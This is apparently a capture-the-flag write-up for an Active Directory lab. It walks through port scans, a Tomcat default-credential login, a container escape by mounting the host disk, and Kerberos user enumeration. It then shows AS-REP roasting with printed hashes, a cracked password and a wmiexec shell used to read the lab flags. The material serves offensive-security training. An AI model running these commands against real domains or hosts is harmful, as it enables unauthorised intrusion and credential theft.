brief `An Active Directory lab that illustrates a Kerberos attack vector impacting user account attributes. You will need to make your way through the maze before attacking the domain.`


## enum 

```sql 
# stager 
Host is up (0.68s latency).
Not shown: 43509 filtered tcp ports (no-response), 22024 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 8d557e0df42898bb1407031678ce24c1 (RSA)
|   256 1ca6155cc44ef8a52768cbcedd7c96b2 (ECDSA)
|_  256 d35c31ef8cd7db5b16aaead9738bdceb (ED25519)
8080/tcp open  http    Apache Tomcat 8.5.78
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit


```

- apace tomcat 8.5.78 
- login in with default creds 
- thats is username = `tomcat` and password = `s3cret`
- lets dig deeper 

```sql 

- never forget good shell /usr/bin/script -qc /bin/bash /dev/null

root@6a8613a93039:~/.ssh# ls -la
ls -la
total 16
drwx------ 2 root root 4096 Aug 16 20:38 .
drwx------ 1 root root 4096 Aug 16 20:38 ..
-rw------- 1 root root 2655 Aug 16 20:38 id_rsa
-rw-r----- 1 root root  571 Aug 16 20:38 id_rsa.pub
root@6a8613a93039:~/.ssh# cd /
cd /
root@6a8613a93039:/# grep Cap /proc/1/status
grep Cap /proc/1/status

CapInh:	0000003fffffffff
CapPrm:	0000003fffffffff
CapEff:	0000003fffffffff
CapBnd:	0000003fffffffff
CapAmb:	0000000000000000
root@6a8613a93039:/# 
root@6a8613a93039:/# v
v
bash: v: command not found
root@6a8613a93039:/# capsh
capsh
bash: capsh: command not found
root@6a8613a93039:/# 
ls /proc


root@6a8613a93039:/# ls /proc
1    219	consoles     kallsyms	  mtrr		 sysvipc
102  38		cpuinfo      kcore	  net		 thread-self
103  43		crypto	     key-users	  pagetypeinfo	 timer_list
104  45		devices      keys	  partitions	 tty
105  47		diskstats    kmsg	  pressure	 uptime
106  48		dma	     kpagecgroup  sched_debug	 version
107  49		driver	     kpagecount   schedstat	 version_signature
183  880	execdomains  kpageflags   scsi		 vmallocinfo
184  898	fb	     loadavg	  self		 vmstat
196  919	filesystems  locks	  slabinfo	 zoneinfo
200  acpi	fs	     mdstat	  softirqs
201  buddyinfo	interrupts   meminfo	  stat
202  bus	iomem	     misc	  swaps
203  cgroups	ioports      modules	  sys
218  cmdline	irq	     mounts	  sysrq-trigger
root@6a8613a93039:/# 
root@6a8613a93039:/# cd /proc.keys
cd /proc.keys
bash: cd: /proc.keys: No such file or directory
root@6a8613a93039:/# cd /proc/keys
cd /proc/keys
bash: cd: /proc/keys: Not a directory
root@6a8613a93039:/# find / -name docker.sock 2>/dev/null
find / -name docker.sock 2>/dev/null
root@6a8613a93039:/# docker images
docker images
bash: docker: command not found
root@6a8613a93039:/# echo '#!/bin/sh' > /cmd
echo '#!/bin/sh' > /cmd
root@6a8613a93039:/#  echo "ps aux > $host_path/output" >> /cmd
 echo "ps aux > $host_path/output" >> /cmd
root@6a8613a93039:/# chmod a+x /cmd
chmod a+x /cmd
root@6a8613a93039:/# cat /cmd
cat /cmd
#!/bin/sh
ps aux > /output
root@6a8613a93039:/# ps aux > /var/lib/docker/overlay2/7f4175c90af7c54c878ffc6726dcb125c416198a2955c70e186bf6a127c5622f/diff/output

<6dcb125c416198a2955c70e186bf6a127c5622f/diff/output
bash: /var/lib/docker/overlay2/7f4175c90af7c54c878ffc6726dcb125c416198a2955c70e186bf6a127c5622f/diff/output: No such file or directory
root@6a8613a93039:/# 

root@6a8613a93039:/# 
root@6a8613a93039:/# lsblk
lsblk
NAME        MAJ:MIN RM  SIZE RO TYPE MOUNTPOINT
loop0         7:0    0 26.6M  1 loop 
loop1         7:1    0 44.7M  1 loop 
loop2         7:2    0 55.5M  1 loop 
loop3         7:3    0 55.7M  1 loop 
loop4         7:4    0 24.6M  1 loop 
nvme0n1     259:0    0    8G  0 disk 
└─nvme0n1p1 259:1    0    8G  0 part /etc/hosts
root@6a8613a93039:/# mount /dev/nvme0n1p1 /mnt
mount /dev/nvme0n1p1 /mnt
root@6a8613a93039:/# cd /mnt/root
cd /mnt/root
root@6a8613a93039:/mnt/root# ls
ls
proof.txt  snap  this_is_not_part_of_the_lab.ovpn
root@6a8613a93039:/mnt/root# cat proo	
cat proof.txt 
Stager6_v1_group_16105-arp5lkf2ej7mlilkz3n8h0xj2h1gppa1
root@6a8613a93039:/mnt/root# 

```

```sql 
root@6a8613a93039:/mnt/root/.ssh# ls
ls
authorized_keys
root@6a8613a93039:/mnt/root/.ssh# cd auth	
cd authorized_keys 
bash: cd: authorized_keys: Not a directory
root@6a8613a93039:/mnt/root/.ssh# cat au	
cat authorized_keys 
no-port-forwarding,no-agent-forwarding,no-X11-forwarding,command="echo 'Please login as the user \"ubuntu\" rather than the user \"root\".';echo;sleep 10;exit 142" ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCdjRudHn8AvTbW8YZHexqtT6Pg2jvTe2w7rOQ8qMLvUrt667brgR6y1I1CUz+39rHHETUaf9O+6Z71pyc6/lVNZt4UjxMqMmxRzFOdAgbguzoy5kBAF/jx8EKO6h7kgPm+FCX+am6Xa5kViZGSGLygUJ3hY53ZpM/yk+aJuNORcgUbyt/iQ/L5zSMAwsCQMQL2wVKi9CM43LV4FwRPVEr5+e9RS7qbpvXqUAMw2JXU6EwR4fGi088pTqxpJj9884xm2+cRfnuzCL6dZCQu3k237x0Zu3F1Mc4pcU8BE2x9PT3Ecb5tA01wsnXQFuVezc+CWfTRVGq+FgO7ETE93L8Z mabennour
no-port-forwarding,no-agent-forwarding,no-X11-forwarding,command="echo 'Please login as the user \"ubuntu\" rather than the user \"root\".';echo;sleep 10;exit 142" ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCGC5gKNkMOQ1xyWtTsv+6X0+6aIRaXTfvcuhTSMjDVoI8fl9JibxElUZyrSn9au3D5j0suihn+BJsYZ2hB8YD1W+3m7DYTTpM4bPg9sGrNwPJlc97mNA9ypQEqLkFFbsU/M0FkYXbzIijiOc7t/+0OPafgb6Yi3bkiuqNpD7SLdfdF50Kmkp+WZe/uJ3xZTLGi0/Dtbpm1pZoEi3LhXzbKDr6FrsOeTJxyJ4gXF4FLZ6SZk09Bbgq9+qHPpdyGtvaib86JDnuhW9Zeyd/z9A/2bPla75zwYln8qZaHM3fTG3ONMdb++GUwqLShaGTJUw59LY7GlWkR1athkm2KtaFL secdojo_labs_key_prod_eu_north_1
```

## tower 

# enum 

-  it's windows lets  get to it 

```sql 
Not shown: 988 filtered tcp ports (no-response)
PORT     STATE SERVICE
53/tcp   open  domain
88/tcp   open  kerberos-sec
135/tcp  open  msrpc
139/tcp  open  netbios-ssn
389/tcp  open  ldap
445/tcp  open  microsoft-ds
464/tcp  open  kpasswd5
593/tcp  open  http-rpc-epmap
636/tcp  open  ldapssl
3268/tcp open  globalcatLDAP
3269/tcp open  globalcatLDAPssl
3389/tcp open  ms-wbt-server


# full scan 

Host is up (0.35s latency).
Not shown: 65513 filtered tcp ports (no-response)
PORT      STATE SERVICE           VERSION
53/tcp    open  domain            Simple DNS Plus
88/tcp    open  kerberos-sec      Microsoft Windows Kerberos (server time: 2024-08-17 01:56:01Z)
135/tcp   open  msrpc             Microsoft Windows RPC
139/tcp   open  netbios-ssn       Microsoft Windows netbios-ssn
389/tcp   open  ldap              Microsoft Windows Active Directory LDAP (Domain: SECDOJO.LAB, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds      Windows Server 2016 Datacenter 14393 microsoft-ds (workgroup: SECDOJO)
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http        Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ldapssl?
3268/tcp  open  ldap              Microsoft Windows Active Directory LDAP (Domain: SECDOJO.LAB, Site: Default-First-Site-Name)
3269/tcp  open  globalcatLDAPssl?
3389/tcp  open  ms-wbt-server     Microsoft Terminal Services
| ssl-cert: Subject: commonName=TOWER.SECDOJO.LAB
| Not valid before: 2024-08-16T01:36:14
|_Not valid after:  2025-02-15T01:36:14
|_ssl-date: 2024-08-17T01:57:36+00:00; -1s from scanner time.
| rdp-ntlm-info: 
|   Target_Name: SECDOJO
|   NetBIOS_Domain_Name: SECDOJO
|   NetBIOS_Computer_Name: TOWER
|   DNS_Domain_Name: SECDOJO.LAB
|   DNS_Computer_Name: TOWER.SECDOJO.LAB
|   DNS_Tree_Name: SECDOJO.LAB
|   Product_Version: 10.0.14393
|_  System_Time: 2024-08-17T01:57:09+00:00
5985/tcp  open  http              Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
5986/tcp  open  ssl/http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_ssl-date: 2024-08-17T01:57:36+00:00; -1s from scanner time.
| tls-alpn: 
|   h2
|_  http/1.1
| ssl-cert: Subject: commonName=TOWER
| Subject Alternative Name: DNS:TOWER, DNS:TOWER.SECDOJO.LAB
| Not valid before: 2022-02-25T16:24:46
|_Not valid after:  2025-02-24T16:24:46
9389/tcp  open  mc-nmf            .NET Message Framing
49666/tcp open  msrpc             Microsoft Windows RPC
49668/tcp open  msrpc             Microsoft Windows RPC
49673/tcp open  ncacn_http        Microsoft Windows RPC over HTTP 1.0
49674/tcp open  msrpc             Microsoft Windows RPC
49677/tcp open  msrpc             Microsoft Windows RPC
49702/tcp open  msrpc             Microsoft Windows RPC
49716/tcp open  msrpc             Microsoft Windows RPC
Service Info: Host: TOWER; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: required
|_nbstat: NetBIOS name: TOWER, NetBIOS user: <unknown>, NetBIOS MAC: 00ff2028f14d (unknown)
|_clock-skew: mean: 0s, deviation: 5s, median: -1s
| smb2-time: 
|   date: 2024-08-17T01:57:06
|_  start_date: 2024-08-17T01:36:22
| smb2-security-mode: 
|   311: 
|_    Message signing enabled and required
| smb-os-discovery: 
|   OS: Windows Server 2016 Datacenter 14393 (Windows Server 2016 Datacenter 6.3)
|   Computer name: TOWER
|   NetBIOS computer name: TOWER\x00
|   Domain name: SECDOJO.LAB
|   Forest name: SECDOJO.LAB
|   FQDN: TOWER.SECDOJO.LAB
|_  System time: 2024-08-17T01:57:08+00:00

```

- intresting 
```sql 
 NetBIOS_Domain_Name: SECDOJO
|   NetBIOS_Computer_Name: TOWER
|   DNS_Domain_Name: SECDOJO.LAB
|   DNS_Computer_Name: TOWER.SECDOJO.LAB
|   DNS_Tree_Name: SECDOJO.LAB
```


```bash

┌─[m1cr0@veric]─[~/tools]
└──╼ $
┌─[m1cr0@veric]─[~/tools]
└──╼ $./kerbrute_linux_amd64 userenum ~/rockyou.txt -d SECDOJO.LAB --dc 10.8.0.3

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: v1.0.3 (9dad6e1) - 08/17/24 - Ronnie Flathers @ropnop

2024/08/17 03:07:10 >  Using KDC(s):
2024/08/17 03:07:10 >  	10.8.0.3:88

2024/08/17 03:13:35 >  [+] VALID USERNAME:	 administrator@SECDOJO.LAB
2024/08/17 03:17:58 >  [+] VALID USERNAME:	 administrator@SECDOJO.LAB
2024/08/17 03:19:55 >  [+] VALID USERNAME:	 tower@SECDOJO.LAB
2024/08/17 03:23:34 >  [+] VALID USERNAME:	 Administrator@SECDOJO.LAB
2024/08/17 03:30:08 >  [+] VALID USERNAME:	 Tower@SECDOJO.LAB
2024/08/17 06:44:19 >  [+] VALID USERNAME:	 TMoulin@SECDOJO.LAB
2024/08/17 06:44:19 >  [+] VALID USERNAME:	 tmoulin@SECDOJO.LAB
2024/08/17 06:44:19 >  [+] VALID USERNAME:	 lmorin@SECDOJO.LAB
2024/08/17 06:44:19 >  [+] VALID USERNAME:	 LMorin@SECDOJO.LAB
2024/08/17 06:44:19 >  [+] VALID USERNAME:	 achevalier@SECDOJO.LAB
2024/08/17 06:44:19 >  [+] VALID USERNAME:	 EPerez@SECDOJO.LAB
2024/08/17 06:44:19 >  [+] VALID USERNAME:	 TColin@SECDOJO.LAB
2024/08/17 06:44:19 >  [+] VALID USERNAME:	 AChevalier@SECDOJO.LAB
2024/08/17 06:44:19 >  [+] VALID USERNAME:	 eperez@SECDOJO.LAB
2024/08/17 06:44:19 >  [+] VALID USERNAME:	 tcolin@SECDOJO.LAB
2024/08/17 06:44:20 >  [+] VALID USERNAME:	 WBarbier@SECDOJO.LAB
2024/08/17 06:44:20 >  [+] VALID USERNAME:	 nfabre@SECDOJO.LAB
2024/08/17 06:44:20 >  [+] VALID USERNAME:	 NFabre@SECDOJO.LAB
2024/08/17 06:44:20 >  [+] VALID USERNAME:	 wbarbier@SECDOJO.LAB
2024/08/17 06:44:20 >  [+] VALID USERNAME:	 LGuillot@SECDOJO.LAB
2024/08/17 06:44:20 >  [+] VALID USERNAME:	 cfleury@SECDOJO.LAB
2024/08/17 06:44:20 >  [+] VALID USERNAME:	 CFleury@SECDOJO.LAB
2024/08/17 06:44:20 >  [+] VALID USERNAME:	 lguillot@SECDOJO.LAB
2024/08/17 06:44:20 >  [+] VALID USERNAME:	 ofernandez@SECDOJO.LAB
2024/08/17 06:44:20 >  [+] VALID USERNAME:	 OFernandez@SECDOJO.LAB
2024/08/17 06:44:20 >  [+] VALID USERNAME:	 MGirard@SECDOJO.LAB
2024/08/17 06:44:20 >  [+] VALID USERNAME:	 mgirard@SECDOJO.LAB
2024/08/17 06:44:20 >  [+] VALID USERNAME:	 hrenard@SECDOJO.LAB
2024/08/17 06:44:20 >  [+] VALID USERNAME:	 FBrunet@SECDOJO.LAB
2024/08/17 06:44:20 >  [+] VALID USERNAME:	 HRenard@SECDOJO.LAB
2024/08/17 06:44:20 >  [+] VALID USERNAME:	 fbrunet@SECDOJO.LAB
2024/08/17 06:44:20 >  [+] VALID USERNAME:	 mgerard@SECDOJO.LAB
2024/08/17 06:44:20 >  [+] VALID USERNAME:	 MMorel@SECDOJO.LAB
2024/08/17 06:44:20 >  [+] VALID USERNAME:	 mmorel@SECDOJO.LAB
2024/08/17 06:44:20 >  [+] VALID USERNAME:	 MGerard@SECDOJO.LAB
2024/08/17 06:44:20 >  [+] VALID USERNAME:	 ERoussel@SECDOJO.LAB
2024/08/17 06:44:20 >  [+] VALID USERNAME:	 eroussel@SECDOJO.LAB
2024/08/17 06:44:20 >  [+] VALID USERNAME:	 NDubois@SECDOJO.LAB
2024/08/17 06:44:20 >  [+] VALID USERNAME:	 ndubois@SECDOJO.LAB
2024/08/17 06:44:20 >  [+] VALID USERNAME:	 mbrunet@SECDOJO.LAB
2024/08/17 06:44:20 >  [+] VALID USERNAME:	 MBrunet@SECDOJO.LAB
2024/08/17 06:44:20 >  [+] VALID USERNAME:	 EPicard@SECDOJO.LAB
2024/08/17 06:44:20 >  [+] VALID USERNAME:	 apicard@SECDOJO.LAB
2024/08/17 06:44:20 >  [+] VALID USERNAME:	 epicard@SECDOJO.LAB
2024/08/17 06:44:20 >  [+] VALID USERNAME:	 APicard@SECDOJO.LAB
2024/08/17 06:44:20 >  [+] VALID USERNAME:	 NLopez@SECDOJO.LAB
2024/08/17 06:44:20 >  [+] VALID USERNAME:	 nlopez@SECDOJO.LAB
2024/08/17 06:44:20 >  [+] VALID USERNAME:	 claurent@SECDOJO.LAB
2024/08/17 06:44:20 >  [+] VALID USERNAME:	 CLaurent@SECDOJO.LAB
2024/08/17 06:44:21 >  [+] VALID USERNAME:	 mrenaud@SECDOJO.LAB
2024/08/17 06:44:21 >  [+] VALID USERNAME:	 ngaillard@SECDOJO.LAB
2024/08/17 06:44:21 >  [+] VALID USERNAME:	 MRenaud@SECDOJO.LAB
2024/08/17 06:44:21 >  [+] VALID USERNAME:	 LDuval@SECDOJO.LAB
2024/08/17 06:44:21 >  [+] VALID USERNAME:	 NGaillard@SECDOJO.LAB
2024/08/17 06:44:21 >  [+] VALID USERNAME:	 TLambert@SECDOJO.LAB
2024/08/17 06:44:21 >  [+] VALID USERNAME:	 cgauthier@SECDOJO.LAB
2024/08/17 06:44:21 >  [+] VALID USERNAME:	 tlambert@SECDOJO.LAB
2024/08/17 06:44:21 >  [+] VALID USERNAME:	 lduval@SECDOJO.LAB
2024/08/17 06:44:21 >  [+] VALID USERNAME:	 CGauthier@SECDOJO.LAB
2024/08/17 06:44:22 >  [+] VALID USERNAME:	 AGiraud@SECDOJO.LAB
2024/08/17 06:44:22 >  [+] VALID USERNAME:	 OCaron@SECDOJO.LAB
2024/08/17 06:44:22 >  [+] VALID USERNAME:	 agiraud@SECDOJO.LAB
2024/08/17 06:44:22 >  [+] VALID USERNAME:	 ocaron@SECDOJO.LAB
2024/08/17 06:44:22 >  [+] VALID USERNAME:	 GOlivier@SECDOJO.LAB
2024/08/17 06:44:22 >  [+] VALID USERNAME:	 aberger@SECDOJO.LAB
2024/08/17 06:44:22 >  [+] VALID USERNAME:	 ABerger@SECDOJO.LAB
2024/08/17 06:44:22 >  [+] VALID USERNAME:	 golivier@SECDOJO.LAB
2024/08/17 06:44:22 >  [+] VALID USERNAME:	 afrancois@SECDOJO.LAB
2024/08/17 06:44:22 >  [+] VALID USERNAME:	 AFrancois@SECDOJO.LAB
2024/08/17 06:44:22 >  [+] VALID USERNAME:	 ALeroux@SECDOJO.LAB
2024/08/17 06:44:22 >  [+] VALID USERNAME:	 aleroux@SECDOJO.LAB
2024/08/17 06:44:22 >  [+] VALID USERNAME:	 dgiraud@SECDOJO.LAB
2024/08/17 06:44:22 >  [+] VALID USERNAME:	 lleclercq@SECDOJO.LAB
2024/08/17 06:44:22 >  [+] VALID USERNAME:	 TRousseau@SECDOJO.LAB
2024/08/17 06:44:22 >  [+] VALID USERNAME:	 DGiraud@SECDOJO.LAB
2024/08/17 06:44:22 >  [+] VALID USERNAME:	 LLeclercq@SECDOJO.LAB
2024/08/17 06:44:22 >  [+] VALID USERNAME:	 trousseau@SECDOJO.LAB
2024/08/17 06:44:22 >  [+] VALID USERNAME:	 TRiviere@SECDOJO.LAB
2024/08/17 06:44:22 >  [+] VALID USERNAME:	 triviere@SECDOJO.LAB
2024/08/17 06:44:22 >  [+] VALID USERNAME:	 ALeclerc@SECDOJO.LAB
2024/08/17 06:44:22 >  [+] VALID USERNAME:	 ldap_user@SECDOJO.LAB
2024/08/17 06:44:22 >  [+] VALID USERNAME:	 svc_sql_staging@SECDOJO.LAB
2024/08/17 06:44:22 >  [+] VALID USERNAME:	 aleclerc@SECDOJO.LAB
2024/08/17 06:44:22 >  [+] VALID USERNAME:	 SVC_SQL_STAGING@SECDOJO.LAB
2024/08/17 06:44:22 >  [+] VALID USERNAME:	 ldap_user@SECDOJO.LAB


```

```bash 
┌─[✗]─[m1cr0@veric]─[~/Desktop/ctfs/ecowasCTF/maze/tower]
└──╼ $impacket-GetNPUsers -dc-ip 10.8.0.3 -usersfile users.txt secdojo.lab/  -no-pass
Impacket v0.11.0 - Copyright 2023 Fortra


$krb5asrep$23$TLambert@SECDOJO.LAB:ea254678797c2c832da2ec91b45511dc$d8eb0f3e1354c1e105b775e8be1dd5f5b2bf3c0c23ebbac79225b700b2ba673c65adee7fa454f1f8a3ebbe21566c9e6cc9a3a27d8d76e906a6813c3c14088e45701bb218aa712edb81ae04954e68815a9c8da143bc7f1480c4cf6f4f6c7d95c359518e35c5e3e743d20ea5b1f9f838448df1c9cf25da677fe4cbf4411456b4f1454af200b53a07e4fc71d2ac8a725cca8b450d4ec6ef58f98c6860534ee33a5d6e3e7087bc75550447dd44a145c6ba7f6cc65520bea0c3ff8c05de6127d83748190e76d21ee4dfe5065fe85a1bd4cc1d6fc7b2d4eb27212a266b4ae1c49a86d613659e0a55420aeaf7a6
$krb5asrep$23$tlambert@SECDOJO.LAB:b17d77026d0b968f907b727fd12a6a62$329f851af1512c33113d06416a36592e258234278864c1044a618152f7ede56d1af3b3280e1f77e140959a69ed750f32cbaef5a4c723481f524f0ea4670dc3d1657cca9cf1f355481bce965de16b6d0742723dcfb1b4801aa7a2fd768cfb548fff40fd46f670e4ce68fe8914a7828d13751f2aec59ce9467930f7a26353b02cf2b508b5284c52873c80c052a2c826d225d9c6a3f6f66f21db99ea7ca24887ef20aba8610e6b9391b96f74fa129d260a870779c5f109c7f9ff457f38a38703bbd428477f565e570fc45aba64acfd4b819d10cd4e5de9bf367bace8f0223fb0e615d72be71e45ddce6e3b0

[-] User ALeroux doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User aleroux doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] User LLeclercq doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User lleclercq doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User DGiraud doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User dgiraud doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User TRousseau doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User trousseau doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User TRiviere doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User triviere doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User ALeclerc doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User aleclerc doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User SVC_SQL_STAGING doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User svc_sql_staging doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User ldap_user doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User ldap_user doesn't have UF_DONT_REQUIRE_PREAUTH set

```

```sql 
first crack 
qwertyuiop       ($krb5asrep$23$TLambert@SECDOJO.LAB)

```

```sql 
┌─[m1cr0@veric]─[~/Desktop/ctfs/ecowasCTF/maze/tower]
└──╼ $impacket-wmiexec secdojo.lab/tlambert:qwertyuiop@10.8.0.3
Impacket v0.11.0 - Copyright 2023 Fortra

[*] SMBv3.0 dialect used
[!] Launching semi-interactive shell - Careful what you execute
[!] Press help for extra shell commands
C:\>dir
 Volume in drive C has no label.
 Volume Serial Number is 5C50-2E88

 Directory of C:\

02/23/2018  11:06 AM    <DIR>          PerfLogs
08/17/2024  05:41 AM            13,061 Program
09/08/2023  02:30 PM    <DIR>          Program Files
02/09/2022  11:27 PM    <DIR>          Program Files (x86)
02/26/2022  05:11 PM    <DIR>          Users
08/17/2024  05:59 AM    <DIR>          Windows
               1 File(s)         13,061 bytes
               5 Dir(s)  12,999,430,144 bytes free

C:\>
```

```sql 
               5 Dir(s)  12,999,430,144 bytes free

C:\>type \Users\Administrator\Desktop\proof.txt
Tower_v1_group_16105-j8wd6b1fyvewry34i5kipqvrxucfhs4i

C:\>


```

